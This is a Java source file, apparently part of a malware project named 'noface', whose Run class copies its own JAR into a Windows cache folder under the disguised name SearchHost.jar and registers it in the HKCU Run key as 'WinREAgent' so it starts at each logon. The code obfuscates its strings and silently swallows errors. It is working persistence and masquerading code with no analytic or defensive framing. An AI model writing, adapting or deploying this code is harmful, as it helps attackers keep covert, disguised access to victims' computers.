package noface.host;

import noface.config.S;

import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

public final class Run {

    public static void arm() {
        try {
            Path src = self();
            if (src == null || !Files.isRegularFile(src)) return;

            String local = System.getenv(S.e("LOCALAPPDATA"));
            if (local == null || local.isBlank()) return;
            Path dir = Path.of(local, S.e("Microsoft"), S.e("Windows"), S.e("Caches"));
            Files.createDirectories(dir);
            Path dst = dir.resolve(S.e("SearchHost.jar"));
            if (!src.toAbsolutePath().normalize().equals(dst.toAbsolutePath().normalize())) {
                Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
            }

            Path java = jvm();
            if (java == null) return;

            String cmd = "\"" + java.toAbsolutePath() + "\" "
                    + S.e("--enable-native-access=ALL-UNNAMED") + " "
                    + S.e("-jar") + " \"" + dst.toAbsolutePath() + "\"";
            reg(S.e("WinREAgent"), cmd);
        } catch (Exception ignored) {
        }
    }

    private static Path self() {
        try {
            URI u = Run.class.getProtectionDomain().getCodeSource().getLocation().toURI();
            Path p = Path.of(u);
            if (Files.isRegularFile(p) && p.getFileName().toString().toLowerCase().endsWith(".jar")) {
                return p;
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static Path jvm() {
        String home = System.getProperty("java.home");
        if (home == null) return null;
        Path bin = Path.of(home, "bin");
        Path javaw = bin.resolve("javaw.exe");
        if (Files.isRegularFile(javaw)) return javaw;
        Path java = bin.resolve("java.exe");
        return Files.isRegularFile(java) ? java : null;
    }

    private static void reg(String name, String value) {
        try {
            new ProcessBuilder(
                    S.e("reg"),
                    S.e("add"),
                    S.e("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                    S.e("/v"),
                    name,
                    S.e("/t"),
                    S.e("REG_SZ"),
                    S.e("/d"),
                    value,
                    S.e("/f")
            ).redirectErrorStream(true).start().waitFor();
        } catch (Exception ignored) {
        }
    }

    private Run() {}
}
